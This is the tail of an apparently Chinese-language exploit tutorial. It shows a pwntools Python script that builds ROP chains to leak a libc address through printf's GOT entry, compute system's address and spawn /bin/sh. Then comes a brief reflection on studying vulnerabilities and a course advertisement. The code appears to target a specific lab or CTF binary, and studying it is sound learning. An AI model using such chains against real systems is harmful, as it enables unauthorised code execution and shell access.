
```python
rop+=p64(0x1f)#->rbx

rop+=p64(0x20)#->rbp

rop+=p64(printf_got_addr-0xf8)#exec printf

rop+=p64(0x0)#

rop+=p64(gets_got_addr)#

rop+=p64(0x400784)#.bss

rop+=p64(0x400740)#

rop+=p64(0x0)*7#

rop+=p64(0x400656)# return to vul

target.sendline(rop)

target.recvuntil(':')

target.recvuntil(': ')

addr=target.recvline()[:-1]

addr = u64(addr+'\x00'*(8-len(addr)))

sys_addr=addr-0x2bdc0

print 'sysaddr is:'

print hex(sys_addr)

rop='a'*72

rop+=p64(0x40075a)#

rop+=p64(0x0)#->rbx

rop+=p64(0x1)#->rbp

rop+=p64(gets_got_addr)#exec system

rop+=p64(0x0)#

rop+=p64(0x0)#

rop+=p64(0x600b30)#.bss

rop+=p64(0x400740)#

rop+=p64(0x0)*7#

rop+=p64(0x40075a)# return to vul

#rop='a'*72

#rop+=p64(0x40075a)#

rop+=p64(0x0)#->rbx

rop+=p64(0x1)#->rbp

rop+=p64(0x600b30)#exec system

rop+=p64(0x0)#

rop+=p64(0x0)#

rop+=p64(0x600b38)#.bss

rop+=p64(0x400740)#

rop+=p64(0x0)*7#

rop+=p64(0x400656)# return to vul

target.sendline(rop)

target.sendline(p64(sys_addr)+'/bin/sh')

target.sendline(rop)

target.interactive()
```

## 六、 总结

在漏洞学习研究的过程中，深感只有亲自去调试漏洞，孤独寂寞地去盯着寄存器的变化，盯着堆栈数据的变化，才能略知其中的奥妙，才能感受到前人的智慧光芒，才能深入理解漏洞成因和漏洞利用的艺术！

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
